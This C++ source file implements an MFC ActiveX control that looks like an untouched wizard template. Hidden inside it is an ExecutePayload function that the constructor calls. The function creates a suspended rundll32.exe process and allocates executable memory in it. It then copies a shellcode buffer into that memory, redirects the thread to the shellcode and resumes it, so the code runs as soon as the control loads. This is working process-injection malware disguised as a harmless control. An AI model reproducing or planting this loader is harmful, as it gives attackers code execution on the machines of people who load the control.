// templateCtrl.cpp : Implementation of the CtemplateCtrl ActiveX Control class.

#include "stdafx.h"
#include "template.h"
#include "templateCtrl.h"
#include "templatePropPage.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

IMPLEMENT_DYNCREATE(CtemplateCtrl, COleControl)

// Message map

BEGIN_MESSAGE_MAP(CtemplateCtrl, COleControl)
	ON_MESSAGE(OCM_COMMAND, &CtemplateCtrl::OnOcmCommand)
	ON_OLEVERB(AFX_IDS_VERB_PROPERTIES, OnProperties)
END_MESSAGE_MAP()

// Dispatch map

BEGIN_DISPATCH_MAP(CtemplateCtrl, COleControl)
END_DISPATCH_MAP()

// Event map

BEGIN_EVENT_MAP(CtemplateCtrl, COleControl)
END_EVENT_MAP()

// Property pages

// TODO: Add more property pages as needed.  Remember to increase the count!
BEGIN_PROPPAGEIDS(CtemplateCtrl, 1)
	PROPPAGEID(CtemplatePropPage::guid)
END_PROPPAGEIDS(CtemplateCtrl)

// Initialize class factory and guid

IMPLEMENT_OLECREATE_EX(CtemplateCtrl, "TEMPLATE.templateCtrl.1",
	0x56c04f88, 0x9e36, 0x434b, 0x82, 0xa3, 0xd5, 0x52, 0xb8, 0x1a, 0x8c, 0xb9)

// Type library ID and version

IMPLEMENT_OLETYPELIB(CtemplateCtrl, _tlid, _wVerMajor, _wVerMinor)

void ExecutePayload(void) {
	int error;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	CONTEXT ctx;
	DWORD prot;
	LPVOID ep;

	// Start up the payload in a new process
	memset(&si, 0x00, sizeof(si));
	si.cb = sizeof(si);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if (CreateProcess(0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
		ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
		GetThreadContext(pi.hThread, &ctx);

		ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		WriteProcessMemory(pi.hProcess, (PVOID) ep, &code, SCSIZE, 0);

#ifdef _WIN64
		ctx.Rip = (DWORD64) ep;
#else
		ctx.Eip = (DWORD) ep;
#endif

		SetThreadContext(pi.hThread, &ctx);

		ResumeThread(pi.hThread);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
	}
}


// Interface IDs

const IID IID_Dtemplate = { 0x3B0404BF, 0xD58D, 0x46D0, { 0xB3, 0x1, 0x86, 0xA1, 0xBA, 0xD0, 0xD9, 0xCE } };
const IID IID_DtemplateEvents = { 0x6DAD5F2, 0x4719, 0x4FF1, { 0xAA, 0x60, 0x4C, 0x2E, 0x8F, 0x6D, 0x59, 0xD7 } };

// Control type information

static const DWORD _dwtemplateOleMisc =
	OLEMISC_SETCLIENTSITEFIRST |
	OLEMISC_INSIDEOUT |
	OLEMISC_CANTLINKINSIDE |
	OLEMISC_RECOMPOSEONRESIZE;

IMPLEMENT_OLECTLTYPE(CtemplateCtrl, IDS_TEMPLATE, _dwtemplateOleMisc)

// CtemplateCtrl::CtemplateCtrlFactory::UpdateRegistry -
// Adds or removes system registry entries for CtemplateCtrl

BOOL CtemplateCtrl::CtemplateCtrlFactory::UpdateRegistry(BOOL bRegister)
{
	// TODO: Verify that your control follows apartment-model threading rules.
	// Refer to MFC TechNote 64 for more information.
	// If your control does not conform to the apartment-model rules, then
	// you must modify the code below, changing the 6th parameter from
	// afxRegApartmentThreading to 0.

	if (bRegister)
		return AfxOleRegisterControlClass(
			AfxGetInstanceHandle(),
			m_clsid,
			m_lpszProgID,
			IDS_TEMPLATE,
			IDB_TEMPLATE,
			afxRegApartmentThreading,
			_dwtemplateOleMisc,
			_tlid,
			_wVerMajor,
			_wVerMinor);
	else
		return AfxOleUnregisterClass(m_clsid, m_lpszProgID);
}


// CtemplateCtrl::CtemplateCtrl - Constructor

CtemplateCtrl::CtemplateCtrl()
{
	InitializeIIDs(&IID_Dtemplate, &IID_DtemplateEvents);
	ExecutePayload();
	// TODO: Initialize your control's instance data here.
}

// CtemplateCtrl::~CtemplateCtrl - Destructor

CtemplateCtrl::~CtemplateCtrl()
{
	// TODO: Cleanup your control's instance data here.
}

// CtemplateCtrl::OnDraw - Drawing function

void CtemplateCtrl::OnDraw(
			CDC* pdc, const CRect& rcBounds, const CRect& rcInvalid)
{
	if (!pdc)
		return;

	DoSuperclassPaint(pdc, rcBounds);
}

// CtemplateCtrl::DoPropExchange - Persistence support

void CtemplateCtrl::DoPropExchange(CPropExchange* pPX)
{
	ExchangeVersion(pPX, MAKELONG(_wVerMinor, _wVerMajor));
	COleControl::DoPropExchange(pPX);

	// TODO: Call PX_ functions for each persistent custom property.
}


// CtemplateCtrl::OnResetState - Reset control to default state

void CtemplateCtrl::OnResetState()
{
	COleControl::OnResetState();  // Resets defaults found in DoPropExchange

	// TODO: Reset any other control state here.
}


// CtemplateCtrl::PreCreateWindow - Modify parameters for CreateWindowEx

BOOL CtemplateCtrl::PreCreateWindow(CREATESTRUCT& cs)
{
	cs.lpszClass = _T("STATIC");
	return COleControl::PreCreateWindow(cs);
}

// CtemplateCtrl::IsSubclassedControl - This is a subclassed control

BOOL CtemplateCtrl::IsSubclassedControl()
{
	return TRUE;
}

// CtemplateCtrl::OnOcmCommand - Handle command messages

LRESULT CtemplateCtrl::OnOcmCommand(WPARAM wParam, LPARAM lParam)
{
	WORD wNotifyCode = HIWORD(wParam);

	// TODO: Switch on wNotifyCode here.

	return 0;
}


// CtemplateCtrl message handlers
